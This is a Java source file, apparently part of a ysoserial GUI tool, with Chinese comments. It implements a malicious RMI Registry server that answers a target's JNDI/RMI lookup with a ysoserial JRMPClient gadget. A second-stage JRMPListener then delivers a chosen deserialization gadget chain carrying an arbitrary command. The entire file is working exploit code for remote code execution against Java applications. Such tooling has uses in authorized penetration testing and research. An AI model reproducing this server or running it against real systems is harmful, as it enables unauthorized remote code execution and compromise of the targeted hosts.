package ysogui.core;

import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URLClassLoader;
import java.rmi.MarshalException;
import java.rmi.server.ObjID;
import java.rmi.server.UID;
import java.util.function.Consumer;

/**
 * RMI JNDI 反序列化服务。
 *
 * 思路：
 * 1. 本地启动一个“恶意 RMI Registry”协议服务，处理 lookup("Exploit")
 * 2. lookup 响应里返回 ysoserial 的 JRMPClient gadget（第一阶段）
 * 3. 目标在 lookup 过程中反序列化 JRMPClient 后，会主动连接到第二阶段 JRMP Listener
 * 4. 第二阶段 Listener 使用 ysoserial.exploit.JRMPListener 投递用户选择的 gadget chain
 *
 * 这样 exploit 逻辑仍然以 ysoserial 为核心，而不是自己手搓 payload。
 */
public class RmiDeserialServer {

    private static final int JRMI_MAGIC = 0x4a524d49;
    private static final short JRMI_VERSION = 2;

    private static final byte STREAM_PROTOCOL = 75;
    private static final byte SINGLE_OP_PROTOCOL = 76;
    private static final byte MULTIPLEX_PROTOCOL = 77;
    private static final byte PROTOCOL_ACK = 78;

    private static final byte TRANSPORT_CALL = 80;
    private static final byte TRANSPORT_RETURN = 81;
    private static final byte TRANSPORT_PING = 82;
    private static final byte TRANSPORT_PING_ACK = 83;
    private static final byte TRANSPORT_DGC_ACK = 84;

    private static final byte RETURN_NORMAL = 1;
    private static final int REGISTRY_LOOKUP_OP = 2;
    private static final int REGISTRY_OBJ_ID_HASH = 0;
    private static final int DGC_OBJ_ID_HASH = 2;

    private final String bindAddr;
    private final int registryPort;
    private final String chainName;
    private final String command;
    private final Consumer<String> logger;
    private final URLClassLoader classLoader;

    private volatile boolean running;
    private volatile ServerSocket serverSocket;
    private volatile Object jrmpListenerInstance;
    private volatile Thread jrmpListenerThread;
    private volatile int jrmpPort;

    public RmiDeserialServer(String bindAddr, int registryPort,
                             String chainName, String command,
                             Consumer<String> logger,
                             ClassLoader classLoader) {
        this.bindAddr = bindAddr;
        this.registryPort = registryPort;
        this.chainName = chainName;
        this.command = command;
        this.logger = logger;
        if (!(classLoader instanceof URLClassLoader)) {
            throw new IllegalArgumentException("RmiDeserialServer 需要 URLClassLoader");
        }
        this.classLoader = (URLClassLoader) classLoader;
    }

    public void start() throws Exception {
        String externalAddr = resolveExternalAddr();
        this.jrmpPort = chooseJrmpPort();

        logger.accept("[RMI-Deser] 启动恶意 RMI Registry: " + bindAddr + ":" + registryPort);
        logger.accept("[RMI-Deser] 一阶段 gadget: JRMPClient -> " + externalAddr + ":" + jrmpPort);
        logger.accept("[RMI-Deser] 二阶段 listener: ysoserial JRMPListener -> " + bindAddr + ":" + jrmpPort);
        logger.accept("[RMI-Deser] 二阶段 payload: " + chainName);

        startJrmpListener();
        Object stage1Payload = makePayloadObject("JRMPClient", externalAddr + ":" + jrmpPort);

        InetAddress addr = "0.0.0.0".equals(bindAddr) || "::".equals(bindAddr)
            ? null
            : InetAddress.getByName(bindAddr);
        this.serverSocket = new ServerSocket(registryPort, 50, addr);
        this.running = true;

        while (running) {
            Socket socket = null;
            try {
                socket = serverSocket.accept();
                socket.setSoTimeout(5000);
                handleConnection(socket, stage1Payload);
            } catch (IOException e) {
                if (!running || isSocketClosed(e)) {
                    break;
                }
                logger.accept("[RMI-Deser] Registry 连接异常: " + e.getMessage());
                closeQuietly(socket);
            } catch (Exception e) {
                logger.accept("[RMI-Deser] Registry 处理异常: " + safeMessage(e));
                closeQuietly(socket);
            }
        }
    }

    private void handleConnection(Socket socket, Object stage1Payload) throws Exception {
        InputStream rawIn = socket.getInputStream();
        InputStream in = rawIn.markSupported() ? rawIn : new BufferedInputStream(rawIn);
        in.mark(4);
        DataInputStream dataIn = new DataInputStream(in);
        DataOutputStream dataOut = new DataOutputStream(socket.getOutputStream());
        logger.accept("[RMI-Deser] 收到连接: " + socket.getRemoteSocketAddress());

        int magic = dataIn.readInt();
        short version = dataIn.readShort();
        logger.accept("[RMI-Deser] 握手头: magic=0x" + Integer.toHexString(magic) + ", version=" + version);
        if (magic != JRMI_MAGIC || version != JRMI_VERSION) {
            logger.accept("[RMI-Deser] 非 JRMI 请求，已关闭");
            return;
        }

        byte protocol = dataIn.readByte();
        logger.accept("[RMI-Deser] 传输协议: " + protocolName(protocol) + " (" + protocol + ")");
        if (protocol == STREAM_PROTOCOL) {
            dataOut.writeByte(PROTOCOL_ACK);
            InetSocketAddress remote = (InetSocketAddress) socket.getRemoteSocketAddress();
            String host = remote.getHostName() != null
                ? remote.getHostName()
                : remote.getAddress().toString();
            dataOut.writeUTF(host);
            dataOut.writeInt(remote.getPort());
            dataOut.flush();
            String clientHost = dataIn.readUTF();
            int clientPort = dataIn.readInt();
            logger.accept("[RMI-Deser] STREAM 握手完成: client=" + clientHost + ":" + clientPort);
        } else if (protocol == MULTIPLEX_PROTOCOL) {
            throw new IOException("Unsupported RMI protocol: Multiplex");
        } else if (protocol != SINGLE_OP_PROTOCOL) {
            throw new IOException("Unsupported RMI protocol: " + protocol);
        } else {
            logger.accept("[RMI-Deser] SINGLE_OP 模式，无需额外握手");
        }

        doMessage(socket, dataIn, dataOut, stage1Payload);
    }

    private void doMessage(Socket socket, DataInputStream in, DataOutputStream out,
                           Object stage1Payload) throws Exception {
        int op = in.read();
        logger.accept("[RMI-Deser] 收到传输操作码: " + transportName(op) + " (" + op + ")");
        switch (op) {
            case TRANSPORT_CALL:
                doCall(in, out, stage1Payload);
                break;
            case TRANSPORT_PING:
                out.writeByte(TRANSPORT_PING_ACK);
                out.flush();
                break;
            case TRANSPORT_DGC_ACK:
                UID.read(in);
                break;
            default:
                throw new IOException("unknown transport op " + op);
        }
        socket.close();
    }

    private void doCall(DataInputStream in, DataOutputStream out,
                        Object stage1Payload) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in);
        ObjID objID;
        try {
            objID = ObjID.read(ois);
        } catch (IOException e) {
            throw new MarshalException("unable to read objID", e);
        }

        int hash = objID.hashCode();
        logger.accept("[RMI-Deser] ObjID hash=" + hash);
        if (hash == DGC_OBJ_ID_HASH) {
            handleDgc(ois);
            return;
        }
        if (hash != REGISTRY_OBJ_ID_HASH) {
            logger.accept("[RMI-Deser] 非 Registry ObjID，忽略");
            return;
        }

        if (handleRegistryLookup(ois, out, stage1Payload)) {
            logger.accept("[RMI-Deser] 已向目标返回 JRMPClient stub，等待其连接二阶段 listener...");
        }
    }

    private boolean handleRegistryLookup(ObjectInputStream in, DataOutputStream out,
                                         Object stage1Payload) throws Exception {
        int op = in.readInt();
        in.readLong(); // interface hash
        logger.accept("[RMI-Deser] Registry op=" + op);
        if (op != REGISTRY_LOOKUP_OP) {
            return false;
        }

        Object lookup = in.readObject();
        String name = String.valueOf(lookup);
        logger.accept("[RMI-Deser] 收到 RMI lookup: " + name);

        out.writeByte(TRANSPORT_RETURN);
        ObjectOutputStream oos = new ObjectOutputStream(out);
        oos.writeByte(RETURN_NORMAL);
        new UID().write(oos);
        oos.writeObject(stage1Payload);
        oos.flush();
        out.flush();
        return true;
    }

    private void handleDgc(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.readInt();
        in.readLong();
        Object ids = in.readObject();
        logger.accept("[RMI-Deser] 收到 DGC 调用: " + String.valueOf(ids));
    }

    private void startJrmpListener() throws Exception {
        final Object payloadObject = makePayloadObject(chainName, command);
        final Class<?> listenerClass = classLoader.loadClass("ysoserial.exploit.JRMPListener");
        final Object listener = listenerClass.getConstructor(int.class, Object.class)
            .newInstance(jrmpPort, payloadObject);
        this.jrmpListenerInstance = listener;

        Thread t = new Thread(() -> {
            Thread current = Thread.currentThread();
            ClassLoader original = current.getContextClassLoader();
            current.setContextClassLoader(classLoader);
            try {
                logger.accept("[RMI-Deser] 二阶段 JRMPListener 已启动: " + jrmpPort);
                listenerClass.getMethod("run").invoke(listener);
            } catch (Exception e) {
                if (running) {
                    logger.accept("[RMI-Deser] JRMPListener 异常: " + safeMessage(e));
                }
            } finally {
                current.setContextClassLoader(original);
            }
        }, "ysogui-rmi-deser-jrmp");
        t.setDaemon(true);
        t.start();
        this.jrmpListenerThread = t;
    }

    private Object makePayloadObject(String payloadName, String arg) throws Exception {
        Thread current = Thread.currentThread();
        ClassLoader original = current.getContextClassLoader();
        current.setContextClassLoader(classLoader);
        try {
            Class<?> utilsClass = classLoader.loadClass("ysoserial.payloads.ObjectPayload$Utils");
            return utilsClass.getMethod("makePayloadObject", String.class, String.class)
                .invoke(null, payloadName, arg);
        } finally {
            current.setContextClassLoader(original);
        }
    }

    private int chooseJrmpPort() throws IOException {
        int candidate = registryPort == 65535 ? registryPort - 1 : registryPort + 1;
        if (candidate < 1) {
            candidate = 1098;
        }
        for (int i = 0; i < 32; i++) {
            int port = candidate + i;
            if (port < 1 || port > 65535 || port == registryPort) {
                continue;
            }
            if (isBindable(port)) {
                return port;
            }
        }
        throw new IOException("无法为二阶段 JRMPListener 找到可用端口");
    }

    private boolean isBindable(int port) {
        ServerSocket ss = null;
        try {
            InetAddress addr = "0.0.0.0".equals(bindAddr) || "::".equals(bindAddr)
                ? null
                : InetAddress.getByName(bindAddr);
            ss = new ServerSocket(port, 50, addr);
            return true;
        } catch (Exception e) {
            return false;
        } finally {
            closeQuietly(ss);
        }
    }

    private String resolveExternalAddr() {
        if (!"0.0.0.0".equals(bindAddr) && !"::".equals(bindAddr)) {
            return bindAddr;
        }
        try {
            Socket s = new Socket();
            s.connect(new InetSocketAddress("8.8.8.8", 53), 1000);
            String addr = s.getLocalAddress().getHostAddress();
            s.close();
            return addr;
        } catch (Exception e) {
            try {
                return InetAddress.getLocalHost().getHostAddress();
            } catch (Exception ignored) {
                return "127.0.0.1";
            }
        }
    }

    private boolean isSocketClosed(Throwable t) {
        String msg = safeMessage(t);
        return msg.contains("closed") || msg.contains("forcibly closed");
    }

    private String protocolName(int protocol) {
        switch (protocol) {
            case STREAM_PROTOCOL:
                return "STREAM";
            case SINGLE_OP_PROTOCOL:
                return "SINGLE_OP";
            case MULTIPLEX_PROTOCOL:
                return "MULTIPLEX";
            default:
                return "UNKNOWN";
        }
    }

    private String transportName(int op) {
        switch (op) {
            case TRANSPORT_CALL:
                return "CALL";
            case TRANSPORT_RETURN:
                return "RETURN";
            case TRANSPORT_PING:
                return "PING";
            case TRANSPORT_PING_ACK:
                return "PING_ACK";
            case TRANSPORT_DGC_ACK:
                return "DGC_ACK";
            default:
                return "UNKNOWN";
        }
    }

    private String safeMessage(Throwable t) {
        Throwable root = t;
        while (root.getCause() != null) {
            root = root.getCause();
        }
        return root.getMessage() != null ? root.getMessage() : root.toString();
    }

    public void stop() {
        running = false;
        closeQuietly(serverSocket);
        serverSocket = null;

        Object listener = jrmpListenerInstance;
        if (listener != null) {
            try {
                listener.getClass().getMethod("close").invoke(listener);
            } catch (Exception ignored) {
            }
        }
        jrmpListenerInstance = null;

        Thread t = jrmpListenerThread;
        if (t != null) {
            t.interrupt();
        }
        jrmpListenerThread = null;

        logger.accept("[RMI-Deser] 服务已停止");
    }

    public boolean isRunning() {
        return running;
    }

    private void closeQuietly(Socket socket) {
        if (socket == null) {
            return;
        }
        try {
            socket.close();
        } catch (IOException ignored) {
        }
    }

    private void closeQuietly(ServerSocket socket) {
        if (socket == null) {
            return;
        }
        try {
            socket.close();
        } catch (IOException ignored) {
        }
    }
}
